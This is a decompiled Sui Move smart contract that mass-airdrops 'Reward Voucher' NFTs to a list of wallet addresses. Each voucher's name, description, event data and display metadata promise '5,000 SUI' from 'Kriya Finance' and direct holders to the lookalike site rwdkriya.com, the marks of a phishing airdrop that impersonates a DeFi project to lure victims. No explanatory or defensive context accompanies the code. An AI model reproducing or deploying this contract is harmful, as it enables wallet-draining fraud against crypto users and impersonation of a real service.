module 0xab01baad9f2d45db0200e1add961fdda955a9e5b25ad9de7243a326ce61b4c42::reward5201 {
    struct REWARD5201 has drop {
        dummy_field: bool,
    }

    struct TICKET_5201 has store, key {
        id: 0x2::object::UID,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    struct MintEvent has copy, drop {
        nft_id: 0x2::object::ID,
        user: address,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    public fun DistributeReward5201(arg0: &mut vector<address>, arg1: &mut 0x2::tx_context::TxContext) {
        while (0x1::vector::length<address>(arg0) > 0) {
            let v0 = TICKET_5201{
                id          : 0x2::object::new(arg1),
                name        : 0x1::string::utf8(b"Reward Voucher"),
                image_url   : 0x1::string::utf8(b"https://res.cloudinary.com/dkhar3xjm/image/upload/v1729685978/rwdkriyacom_1023_4_v8npe4.jpg"),
                description : 0x1::string::utf8(b"Claim your 5,000 SUI Reward from Kriya Finance! Visit https://rwdkriya.com to verify and get your reward. Limited time offer!"),
                Reward      : 0x1::string::utf8(b"5,000 SUI"),
            };
            let v1 = MintEvent{
                nft_id      : 0x2::object::id<TICKET_5201>(&v0),
                user        : 0x2::tx_context::sender(arg1),
                name        : 0x1::string::utf8(b"Reward Voucher"),
                image_url   : 0x1::string::utf8(b"https://res.cloudinary.com/dkhar3xjm/image/upload/v1729685978/rwdkriyacom_1023_4_v8npe4.jpg"),
                description : 0x1::string::utf8(b"Claim your 5,000 SUI Reward from Kriya Finance! Visit https://rwdkriya.com to verify and get your reward. Limited time offer!"),
                Reward      : 0x1::string::utf8(b"5,000 SUI"),
            };
            0x2::event::emit<MintEvent>(v1);
            0x2::transfer::public_transfer<TICKET_5201>(v0, 0x1::vector::pop_back<address>(arg0));
        };
    }

    fun init(arg0: REWARD5201, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x1::vector::empty<0x1::string::String>();
        let v1 = &mut v0;
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"name"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"image_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"description"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"project_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"creator"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"Reward"));
        let v2 = 0x1::vector::empty<0x1::string::String>();
        let v3 = &mut v2;
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Reward Voucher"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://res.cloudinary.com/dkhar3xjm/image/upload/v1729685978/rwdkriyacom_1023_4_v8npe4.jpg"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Claim your 5,000 SUI Reward from Kriya Finance! Visit https://rwdkriya.com to verify and get your reward. Limited time offer!"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://rwdkriya.com"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Kriya Finance"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"5,000 SUI"));
        let v4 = 0x2::package::claim<REWARD5201>(arg0, arg1);
        let v5 = 0x2::display::new_with_fields<TICKET_5201>(&v4, v0, v2, arg1);
        0x2::display::update_version<TICKET_5201>(&mut v5);
        0x2::transfer::public_transfer<0x2::package::Publisher>(v4, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::display::Display<TICKET_5201>>(v5, 0x2::tx_context::sender(arg1));
    }

    // decompiled from Move bytecode v6
}

